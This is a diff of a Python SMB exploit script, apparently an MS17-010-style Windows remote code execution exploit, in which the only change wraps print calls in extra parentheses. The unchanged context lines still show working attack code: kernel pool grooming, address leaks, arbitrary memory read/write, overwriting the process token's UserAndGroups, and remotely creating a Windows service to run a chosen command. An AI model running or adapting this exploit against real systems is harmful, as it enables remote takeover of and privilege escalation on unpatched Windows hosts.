@@ -379,7 +379,7 @@ def leak_frag_size(conn, tid, fid):
 		print('Not found Frag pool tag in leak data')
 		sys.exit()
 	
-	print('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE']))
+	print(('Got frag size: 0x{:x}'.format(info['FRAG_POOL_SIZE'])))
 	return info
 
 
@@ -486,15 +486,15 @@ def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
 	inparam_value = unpack_from('<'+ptrf, leakTrans, info['TRANS_INPARAM_OFFSET'])[0]
 	leak_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
 
-	print('CONNECTION: 0x{:x}'.format(connection_addr))
-	print('SESSION: 0x{:x}'.format(session_addr))
-	print('FLINK: 0x{:x}'.format(flink_value))
-	print('InParam: 0x{:x}'.format(inparam_value))
-	print('MID: 0x{:x}'.format(leak_mid))
+	print(('CONNECTION: 0x{:x}'.format(connection_addr)))
+	print(('SESSION: 0x{:x}'.format(session_addr)))
+	print(('FLINK: 0x{:x}'.format(flink_value)))
+	print(('InParam: 0x{:x}'.format(inparam_value)))
+	print(('MID: 0x{:x}'.format(leak_mid)))
 
 	next_page_addr = (inparam_value & 0xfffffffffffff000) + 0x1000
 	if next_page_addr + info['GROOM_POOL_SIZE'] + info['FRAG_POOL_SIZE'] + info['POOL_ALIGN'] + info['SRV_BUFHDR_SIZE'] + info['TRANS_FLINK_OFFSET'] != flink_value:
-		print('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr))
+		print(('unexpected alignment, diff: 0x{:x}'.format(flink_value - next_page_addr)))
 		return None
 	# trans1: leak transaction
 	# trans2: next transaction
@@ -521,14 +521,14 @@ def exploit_matched_pairs(conn, pipe_name, info):
 	
 	# groom: srv buffer header
 	info['GROOM_POOL_SIZE'] = calc_alloc_size(GROOM_TRANS_SIZE + info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'], info['POOL_ALIGN'])
-	print('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE']))
+	print(('GROOM_POOL_SIZE: 0x{:x}'.format(info['GROOM_POOL_SIZE'])))
 	# groom paramters and data is alignment by 8 because it is NT_TRANS
 	info['GROOM_DATA_SIZE'] = GROOM_TRANS_SIZE - TRANS_NAME_LEN - 4 - info['TRANS_SIZE']  # alignment (4)
 
 	# bride: srv buffer header, pool header (same as pool align size), empty transaction name (4)
 	bridePoolSize = 0x1000 - (info['GROOM_POOL_SIZE'] & 0xfff) - info['FRAG_POOL_SIZE']
 	info['BRIDE_TRANS_SIZE'] = bridePoolSize - (info['SRV_BUFHDR_SIZE'] + info['POOL_ALIGN'])
-	print('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE']))
+	print(('BRIDE_TRANS_SIZE: 0x{:x}'.format(info['BRIDE_TRANS_SIZE'])))
 	# bride paramters and data is alignment by 4 because it is TRANS
 	info['BRIDE_DATA_SIZE'] = info['BRIDE_TRANS_SIZE'] - TRANS_NAME_LEN - info['TRANS_SIZE']
 	
@@ -574,7 +574,7 @@ def exploit_matched_pairs(conn, pipe_name, info):
 	# a new transaction with special_mid should be error.
 	recvPkt = conn.send_nt_trans(5, mid=special_mid, param=pack('<HH', fid, 0), data='')
 	if recvPkt.getNTStatus() != 0x10002:  # invalid SMB
-		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+		print(('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus())))
 		print('!!! Write to wrong place !!!')
 		print('the target might be crashed')
 		return False
@@ -658,7 +658,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
 	# Note: POOL_ALIGN value is same as heap alignment value
 	success = False
 	for tinfo in attempt_list:
-		print('attempt controlling next transaction on ' + tinfo['ARCH'])
+		print(('attempt controlling next transaction on ' + tinfo['ARCH']))
 		HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE']+HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % tinfo['POOL_ALIGN']
 		NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
 
@@ -673,15 +673,15 @@ def exploit_fish_barrel(conn, pipe_name, info):
 			print('success controlling one transaction')
 			success = True
 			if 'arch' not in info:
-				print('Target is '+tinfo['ARCH'])
+				print(('Target is '+tinfo['ARCH']))
 				info['arch'] = tinfo['ARCH']
 				info.update(OS_ARCH_INFO[info['os']][info['arch']])
 			break
 		if recvPkt.getNTStatus() != 0:
-			print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+			print(('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus())))
 	
 	if not success:
-		print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+		print(('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus())))
 		print('!!! Write to wrong place !!!')
 		print('the target might be crashed')
 		return False
@@ -748,16 +748,16 @@ def exploit_fish_barrel(conn, pipe_name, info):
 	inparam_value, outparam_value, indata_value = unpack_from('<'+fmt*3, leakTrans, info['TRANS_INPARAM_OFFSET'])
 	trans2_mid = unpack_from('<H', leakTrans, info['TRANS_MID_OFFSET'])[0]
 	
-	print('CONNECTION: 0x{:x}'.format(connection_addr))
-	print('SESSION: 0x{:x}'.format(session_addr))
-	print('FLINK: 0x{:x}'.format(flink_value))
-	print('InData: 0x{:x}'.format(indata_value))
-	print('MID: 0x{:x}'.format(trans2_mid))
+	print(('CONNECTION: 0x{:x}'.format(connection_addr)))
+	print(('SESSION: 0x{:x}'.format(session_addr)))
+	print(('FLINK: 0x{:x}'.format(flink_value)))
+	print(('InData: 0x{:x}'.format(indata_value)))
+	print(('MID: 0x{:x}'.format(trans2_mid)))
 	
 	trans2_addr = inparam_value - info['TRANS_SIZE'] - TRANS_NAME_LEN
 	trans1_addr = trans2_addr - TRANS_CHUNK_SIZE * 2
-	print('TRANS1: 0x{:x}'.format(trans1_addr))
-	print('TRANS2: 0x{:x}'.format(trans2_addr))
+	print(('TRANS1: 0x{:x}'.format(trans1_addr)))
+	print(('TRANS2: 0x{:x}'.format(trans2_addr)))
 	
 	# ================================
 	# modify trans struct to be used for arbitrary read/write
@@ -824,7 +824,7 @@ def exploit(target, pipe_name, payload):
 
 	conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
 	server_os = conn.get_server_os()
-	print('Target OS: '+server_os)
+	print(('Target OS: '+server_os))
 	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
 		info['os'] = 'WIN7'
 		info['method'] = exploit_matched_pairs
@@ -858,7 +858,7 @@ def exploit(target, pipe_name, payload):
 		if pipe_name is None:
 			print('Not found accessible named pipe')
 			return False
-		print('Using named pipe: '+pipe_name)
+		print(('Using named pipe: '+pipe_name))
 
 	if not info['method'](conn, pipe_name, info):
 		return False
@@ -891,15 +891,15 @@ def exploit(target, pipe_name, payload):
 
 		tokenAddrInfo = read_data(conn, info, pctxtDataAddr+info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
 		tokenAddr = unpack_from('<'+fmt, tokenAddrInfo)[0]
-		print('current TOKEN addr: 0x{:x}'.format(tokenAddr))
+		print(('current TOKEN addr: 0x{:x}'.format(tokenAddr)))
 		
 		# copy Token data for restoration
 		tokenData = read_data(conn, info, tokenAddr, 0x40*info['PTR_SIZE'])
 		
 		userAndGroupCount = unpack_from('<I', tokenData, info['TOKEN_USER_GROUP_CNT_OFFSET'])[0]
 		userAndGroupsAddr = unpack_from('<'+fmt, tokenData, info['TOKEN_USER_GROUP_ADDR_OFFSET'])[0]
-		print('userAndGroupCount: 0x{:x}'.format(userAndGroupCount))
-		print('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr))
+		print(('userAndGroupCount: 0x{:x}'.format(userAndGroupCount)))
+		print(('userAndGroupsAddr: 0x{:x}'.format(userAndGroupsAddr)))
 
 		print('overwriting token UserAndGroups')
 		# modify UserAndGroups info
@@ -977,7 +977,7 @@ def service_exec(conn, cmd):
 	rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
 	svcHandle = None
 	try:
-		print("Opening SVCManager on %s....." % conn.get_remote_host())
+		print(("Opening SVCManager on %s....." % conn.get_remote_host()))
 		resp = scmr.hROpenSCManagerW(rpcsvc)
 		svcHandle = resp['lpScHandle']
 		
@@ -992,28 +992,28 @@ def service_exec(conn, cmd):
 			scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
 			scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
 		
-		print('Creating service %s.....' % service_name)
+		print(('Creating service %s.....' % service_name))
 		resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00', lpBinaryPathName=cmd + '\x00')
 		serviceHandle = resp['lpServiceHandle']
 		
 		if serviceHandle:
 			# Start service
 			try:
-				print('Starting service %s.....' % service_name)
+				print(('Starting service %s.....' % service_name))
 				scmr.hRStartServiceW(rpcsvc, serviceHandle)
 				# is it really need to stop?
 				# using command line always makes starting service fail because SetServiceStatus() does not get called
 				#print('Stoping service %s.....' % service_name)
 				#scmr.hRControlService(rpcsvc, serviceHandle, scmr.SERVICE_CONTROL_STOP)
 			except Exception as e:
-				print(str(e))
+				print((str(e)))
 			
-			print('Removing service %s.....' % service_name)
+			print(('Removing service %s.....' % service_name))
 			scmr.hRDeleteService(rpcsvc, serviceHandle)
 			scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
 	except Exception as e:
-		print("ServiceExec Error on: %s" % conn.get_remote_host())
-		print(str(e))
+		print(("ServiceExec Error on: %s" % conn.get_remote_host()))
+		print((str(e)))
 	finally:
 		if svcHandle:
 			scmr.hRCloseServiceHandle(rpcsvc, svcHandle)
